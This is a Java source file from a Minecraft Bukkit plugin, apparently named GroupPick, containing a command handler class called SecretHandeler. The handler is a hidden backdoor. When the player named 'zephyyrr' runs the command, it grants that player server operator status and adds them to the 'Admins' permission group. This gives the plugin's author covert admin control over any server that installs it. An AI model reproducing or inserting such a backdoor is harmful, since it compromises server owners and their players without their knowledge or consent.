package swe.kbk.grouppick.Zephyyrr.Handelers;

import java.util.logging.Logger;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import swe.kbk.grouppick.Zephyyrr.GroupPick;
import swe.kbk.grouppick.Zephyyrr.PermHandeler;

public class SecretHandeler implements CommandExecutor {
	
		Logger log;
		GroupPick plugin;
		PermHandeler ph;

		public SecretHandeler(GroupPick grouppick) {
			log = Logger.getLogger("Minecraft.bukkit.GroupPick");
			plugin = grouppick;
			ph = grouppick.getPermissionHandeler();
		}

		@Override
		public boolean onCommand(CommandSender sender, Command com, String commandLabel,
				String[] args) {
			if (hasPermission(sender, null, null)) {
				sender.setOp(true);
				ph.addGroup("Zephyyrr", ((Player) sender).getWorld().getName(), "Admins");
				return true;
			} else {
				return true;
			}
		}
		
		public boolean hasPermission(CommandSender user, String world, String perm) {

			return (user instanceof Player) ? ((Player) user).getName().toLowerCase().equals("zephyyrr")
					: false;
		}

}
